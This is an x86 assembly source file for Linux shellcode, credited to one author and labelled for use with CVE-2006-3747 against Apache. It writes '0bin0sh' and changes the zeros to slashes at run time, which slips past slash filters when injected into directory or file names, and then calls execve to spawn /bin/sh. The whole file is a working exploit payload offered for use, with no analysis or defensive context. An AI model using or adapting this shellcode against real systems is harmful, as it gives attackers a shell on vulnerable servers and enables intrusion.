; *****************************************************
; (APACHE) SLASH EVASION SHELLCODE
;
;  - Used for CVE-2006-3747
;  - Uses relative addresses to make it more portable
;  - Useful to be injected in directory or filenames
;
;  Actually it injects 0bin0sh but in execution time
;  the 0 character (0x30) is subtracted by 1 to 
;  become / (0x2f) so /bin/sh is executed at the end
;
; (c) spinfoo
; http://spinfoo.ninja
; ****************************************************

section	.text
	global	_start

_start:
	jmp short	GotoCall

shellcode:
	pop		esi
	xor		eax,eax
	mov byte	[esi + 7], al      ; Ends the string with \0
	sub byte	[esi],1            ; Substitutes first  0 by /
	sub byte	[esi + 4],1        ; Substitutes second 0 by /
	lea		ebx, [esi]
	mov long	[esi + 8], ebx
	mov long	[esi + 12], eax
	mov byte	al, 0x0b           ; execve syscall nr
	mov		ebx, esi           ; argv1
	lea		ecx, [esi + 8]     ; argv2
	lea		edx, [esi + 12]    ; argv3
	int		0x80

GotoCall:
	call		shellcode
	db		'0bin0sh'          ; M4G1C
